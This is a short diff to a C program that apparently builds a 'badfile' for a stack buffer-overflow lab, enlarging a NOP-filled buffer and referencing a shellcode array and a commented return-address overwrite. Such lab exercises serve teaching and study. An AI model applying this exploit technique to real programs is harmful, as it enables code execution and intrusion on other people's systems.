@@ -20,11 +20,11 @@ char shellcode[]=
 
 void main(int argc, char **argv)
 {
-    char buffer[450];
+    char buffer[460];
     FILE *badfile;
 
     /* Initialize buffer with 0x90 (NOP instruction) */
-    memset(&buffer, 0x90, 450);
+    memset(&buffer, 0x90, 460);
 
     /*Properly fill the buffer here*/
     /*ret = 0xbffff178 + 100;      replace the original return address*/
